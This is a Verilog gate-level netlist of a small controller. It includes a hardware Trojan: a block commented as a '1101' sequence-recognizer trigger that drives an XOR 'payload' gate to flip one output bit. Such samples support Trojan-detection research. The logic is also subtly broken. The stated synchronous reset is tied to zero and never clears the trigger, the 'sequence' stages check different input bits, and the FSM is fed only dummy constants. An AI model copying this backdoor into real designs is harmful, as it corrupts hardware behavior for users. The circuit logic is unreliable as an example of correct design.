// Flat gate-level netlist of a controller with FSM
// Standard cell primitives: DFF, AND2, OR2, NAND2, NOR2, XOR2, INV, BUF

module controller_netlist (
    input  wire clk,
    input  wire rst_n,
    input  wire [3:0] data_in,
    output wire [3:0] data_out
);

    // Internal nets
    wire n1, n2, n3, n4, n5, n6, n7, n8, n9, n10;
    wire n11, n12, n13, n14, n15, n16, n17, n18, n19, n20;
    wire n21, n22, n23, n24, n25, n26, n27, n28, n29, n30;
    wire n31, n32, n33, n34, n35, n36, n37, n38, n39, n40;
    wire n41, n42, n43, n44, n45, n46, n47, n48, n49, n50;
    wire n51, n52, n53, n54, n55, n56, n57, n58, n59, n60;
    wire n61, n62, n63, n64, n65, n66, n67, n68, n69, n70;
    wire n71, n72, n73, n74, n75, n76, n77, n78, n79, n80;
    wire n81, n82, n83, n84, n85, n86, n87, n88, n89, n90;
    wire n91, n92, n93, n94, n95, n96, n97, n98, n99, n100;
    wire n101, n102, n103, n104, n105, n106, n107, n108, n109, n110;
    wire n111, n112, n113, n114, n115, n116, n117, n118, n119, n120;
    wire n121, n122, n123, n124, n125, n126, n127, n128, n129, n130;
    wire n131, n132, n133, n134, n135, n136, n137, n138, n139, n140;
    wire n141, n142, n143, n144, n145, n146, n147, n148, n149, n150;
    wire n151, n152, n153, n154, n155, n156, n157, n158, n159, n160;
    wire n161, n162, n163, n164, n165, n166, n167, n168, n169, n170;
    wire n171, n172, n173, n174, n175, n176, n177, n178, n179, n180;
    wire n181, n182, n183, n184, n185, n186, n187, n188, n189, n190;
    wire n191, n192, n193, n194, n195, n196, n197, n198, n199, n200;

    // FSM state registers (4 DFFs)
    DFF state_reg_0 (.D(n10), .CLK(clk), .Q(n11));
    DFF state_reg_1 (.D(n12), .CLK(clk), .Q(n13));
    DFF state_reg_2 (.D(n14), .CLK(clk), .Q(n15));
    DFF state_reg_3 (.D(n16), .CLK(clk), .Q(n17));

    // Next-state logic for state_reg_0
    AND2 u_and_0 (.A(n18), .B(n19), .Y(n20));
    OR2  u_or_0  (.A(n21), .B(n22), .Y(n10));
    INV  u_inv_0 (.A(n23), .Y(n24));
    NAND2 u_nand_0 (.A(n25), .B(n26), .Y(n27));
    NOR2 u_nor_0 (.A(n28), .B(n29), .Y(n30));

    // Next-state logic for state_reg_1
    AND2 u_and_1 (.A(n31), .B(n32), .Y(n33));
    OR2  u_or_1  (.A(n34), .B(n35), .Y(n12));
    INV  u_inv_1 (.A(n36), .Y(n37));
    NAND2 u_nand_1 (.A(n38), .B(n39), .Y(n40));
    NOR2 u_nor_1 (.A(n41), .B(n42), .Y(n43));

    // Next-state logic for state_reg_2
    AND2 u_and_2 (.A(n44), .B(n45), .Y(n46));
    OR2  u_or_2  (.A(n47), .B(n48), .Y(n14));
    INV  u_inv_2 (.A(n49), .Y(n50));
    NAND2 u_nand_2 (.A(n51), .B(n52), .Y(n53));
    NOR2 u_nor_2 (.A(n54), .B(n55), .Y(n56));

    // Next-state logic for state_reg_3
    AND2 u_and_3 (.A(n57), .B(n58), .Y(n59));
    OR2  u_or_3  (.A(n60), .B(n61), .Y(n16));
    INV  u_inv_3 (.A(n62), .Y(n63));
    NAND2 u_nand_3 (.A(n64), .B(n65), .Y(n66));
    NOR2 u_nor_3 (.A(n67), .B(n68), .Y(n69));

    // Data output logic (normal function)
    BUF u_buf_0 (.A(data_in[0]), .Y(data_out[0]));
    BUF u_buf_1 (.A(data_in[1]), .Y(data_out[1]));
    XOR2 u_xor_payload (.A(data_in[2]), .B(n70), .Y(data_out[2]));
    BUF u_buf_3 (.A(data_in[3]), .Y(data_out[3]));

    // Trojan trigger logic (sequence recognizer for 1101)
    // Input conditioning
    INV u_inv_in0 (.A(data_in[0]), .Y(n71));
    INV u_inv_in1 (.A(data_in[1]), .Y(n72));
    INV u_inv_in2 (.A(data_in[2]), .Y(n73));
    INV u_inv_in3 (.A(data_in[3]), .Y(n74));

    // Stage 0: detect first '1'
    AND2 u_trig_and0 (.A(data_in[0]), .B(n75), .Y(n76));
    OR2  u_trig_or0  (.A(n76), .B(n77), .Y(n78));
    DFF  u_trig_dff0 (.D(n78), .CLK(clk), .Q(n79));

    // Stage 1: detect second '1' after first
    AND2 u_trig_and1 (.A(data_in[1]), .B(n79), .Y(n80));
    OR2  u_trig_or1  (.A(n80), .B(n81), .Y(n82));
    DFF  u_trig_dff1 (.D(n82), .CLK(clk), .Q(n83));

    // Stage 2: detect '0' after two '1's
    AND2 u_trig_and2 (.A(n71), .B(n83), .Y(n84));
    OR2  u_trig_or2  (.A(n84), .B(n85), .Y(n86));
    DFF  u_trig_dff2 (.D(n86), .CLK(clk), .Q(n87));

    // Stage 3: detect final '1' after 110
    AND2 u_trig_and3 (.A(data_in[3]), .B(n87), .Y(n88));
    OR2  u_trig_or3  (.A(n88), .B(n89), .Y(n90));
    DFF  u_trig_dff3 (.D(n90), .CLK(clk), .Q(n70));

    // Reset logic for trigger DFFs (synchronous reset)
    INV u_inv_rst (.A(rst_n), .Y(n91));
    AND2 u_rst_and0 (.A(n91), .B(n92), .Y(n75));
    AND2 u_rst_and1 (.A(n91), .B(n93), .Y(n77));
    AND2 u_rst_and2 (.A(n91), .B(n94), .Y(n81));
    AND2 u_rst_and3 (.A(n91), .B(n95), .Y(n85));
    AND2 u_rst_and4 (.A(n91), .B(n96), .Y(n89));

    // Tie-offs for unused reset inputs
    BUF u_tie0 (.A(1'b0), .Y(n92));
    BUF u_tie1 (.A(1'b0), .Y(n93));
    BUF u_tie2 (.A(1'b0), .Y(n94));
    BUF u_tie3 (.A(1'b0), .Y(n95));
    BUF u_tie4 (.A(1'b0), .Y(n96));

    // Dummy connections for FSM next-state logic (to avoid unconnected warnings)
    BUF u_dummy0 (.A(1'b0), .Y(n18));
    BUF u_dummy1 (.A(1'b0), .Y(n19));
    BUF u_dummy2 (.A(1'b0), .Y(n21));
    BUF u_dummy3 (.A(1'b0), .Y(n22));
    BUF u_dummy4 (.A(1'b0), .Y(n23));
    BUF u_dummy5 (.A(1'b0), .Y(n25));
    BUF u_dummy6 (.A(1'b0), .Y(n26));
    BUF u_dummy7 (.A(1'b0), .Y(n28));
    BUF u_dummy8 (.A(1'b0), .Y(n29));
    BUF u_dummy9 (.A(1'b0), .Y(n31));
    BUF u_dummy10 (.A(1'b0), .Y(n32));
    BUF u_dummy11 (.A(1'b0), .Y(n34));
    BUF u_dummy12 (.A(1'b0), .Y(n35));
    BUF u_dummy13 (.A(1'b0), .Y(n36));
    BUF u_dummy14 (.A(1'b0), .Y(n38));
    BUF u_dummy15 (.A(1'b0), .Y(n39));
    BUF u_dummy16 (.A(1'b0), .Y(n41));
    BUF u_dummy17 (.A(1'b0), .Y(n42));
    BUF u_dummy18 (.A(1'b0), .Y(n44));
    BUF u_dummy19 (.A(1'b0), .Y(n45));
    BUF u_dummy20 (.A(1'b0), .Y(n47));
    BUF u_dummy21 (.A(1'b0), .Y(n48));
    BUF u_dummy22 (.A(1'b0), .Y(n49));
    BUF u_dummy23 (.A(1'b0), .Y(n51));
    BUF u_dummy24 (.A(1'b0), .Y(n52));
    BUF u_dummy25 (.A(1'b0), .Y(n54));
    BUF u_dummy26 (.A(1'b0), .Y(n55));
    BUF u_dummy27 (.A(1'b0), .Y(n57));
    BUF u_dummy28 (.A(1'b0), .Y(n58));
    BUF u_dummy29 (.A(1'b0), .Y(n60));
    BUF u_dummy30 (.A(1'b0), .Y(n61));
    BUF u_dummy31 (.A(1'b0), .Y(n62));
    BUF u_dummy32 (.A(1'b0), .Y(n64));
    BUF u_dummy33 (.A(1'b0), .Y(n65));
    BUF u_dummy34 (.A(1'b0), .Y(n67));
    BUF u_dummy35 (.A(1'b0), .Y(n68));

endmodule

// Standard cell primitives
module DFF (input D, CLK, output reg Q);
    always @(posedge CLK) Q <= D;
endmodule

module AND2 (input A, B, output Y);
    assign Y = A & B;
endmodule

module OR2 (input A, B, output Y);
    assign Y = A | B;
endmodule

module NAND2 (input A, B, output Y);
    assign Y = ~(A & B);
endmodule

module NOR2 (input A, B, output Y);
    assign Y = ~(A | B);
endmodule

module XOR2 (input A, B, output Y);
    assign Y = A ^ B;
endmodule

module INV (input A, output Y);
    assign Y = ~A;
endmodule

module BUF (input A, output Y);
    assign Y = A;
endmodule